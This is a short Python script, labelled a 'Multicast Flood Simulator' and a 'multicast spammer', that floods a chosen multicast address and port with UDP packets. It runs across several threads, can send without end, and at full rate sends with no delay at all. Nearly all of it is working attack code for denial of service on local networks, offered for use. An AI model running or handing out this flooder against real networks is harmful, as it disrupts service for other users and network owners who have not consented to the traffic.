import socket
import argparse
import time
import threading
import sys

#Super epic multicast spammer

print("Multicast Flood Simulator V1.1 \nMade by Poplel for more info go to poplel.xyz")

def multicast_flood(mcast_adr, mcast_port, num_packets, rate):
    message = b"MULTICASTSPAMPACKETS"
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            ttl = 3
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)

            base_delay = 0.001
            delay_per_packet = base_delay * (100 - rate) / 100

            if num_packets == 0:
                print(f"Sending packets to {mcast_adr}:{mcast_port} at {rate}% speed (infinite packets)")
                packet_count = 0
                while True:
                    sock.sendto(message, (mcast_adr, mcast_port))
                    packet_count += 1
                    if packet_count % 100 == 0:
                        print(f"Sent {packet_count} packets", end='\r')
                    if delay_per_packet > 0:
                        time.sleep(delay_per_packet)
            else:
                print(f"Sending {num_packets} packets to {mcast_adr}:{mcast_port} at {rate}% speed")
                for i in range(num_packets):
                    sock.sendto(message, (mcast_adr, mcast_port))
                    print(f"Sent packet {i + 1}/{num_packets}")
                    if delay_per_packet > 0:
                        time.sleep(delay_per_packet)
                print("\nFinished")

    except KeyboardInterrupt:
        print("\n\nScript interrupted")
    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multicast flooder")
    parser.add_argument("mcast_adr", help="Group address")
    parser.add_argument("mcast_port", type=int, help="port number")
    parser.add_argument("num_packets", type=int, help="Number of packets to send, 0 for infinite")
    parser.add_argument("num_threads", type=int, help="Number of threads")
    parser.add_argument("rate", type=int, default=100, help="Rate of sending as a percentage (1-100)")

    args = parser.parse_args()

    if args.rate == 0:
        print("You can't run this at 0% or it won't work")
        sys.exit(1)
    elif not (1 <= args.rate <= 100):
        print("Rate must be between 1 and 100.")
        sys.exit(1)

    threads = []
    for _ in range(args.num_threads):
        thread = threading.Thread(target=multicast_flood, args=(args.mcast_adr, args.mcast_port, args.num_packets, args.rate))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
